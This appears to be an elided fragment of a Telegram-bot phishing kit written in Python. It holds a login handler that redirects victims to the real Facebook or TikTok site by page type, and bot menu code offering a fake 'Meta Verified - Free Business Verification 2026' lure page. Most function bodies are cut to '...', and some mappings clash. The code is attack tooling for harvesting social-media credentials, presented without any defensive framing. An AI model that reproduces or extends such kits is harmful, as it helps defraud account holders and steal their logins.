...
def handle_login():
    ...
    if 'facebook' in referrer or 'facebook' in page_type:
        ...
        redirect_url = 'https://www.tiktok.com/'
    elif 'meta_verify' in referrer or 'meta' in page_type:
        real_page_type = 'meta_verify'
        redirect_url = 'https://www.facebook.com/'
    else:
...
async def menu_advance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    keyboard = InlineKeyboardMarkup([
        ...
        [InlineKeyboardButton("💎 Meta Verified", callback_data="adv_tiktok")],
        [InlineKeyboardButton("🤧Back🥴🤢", callback_data="back")]
    ])
...
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if data == "menu_main":
        ...
        await show_page(update, context, "💎 Meta Verified - Free Business Verification 2026", "meta_verify", "menu_advance", "meta_verify")
    else:
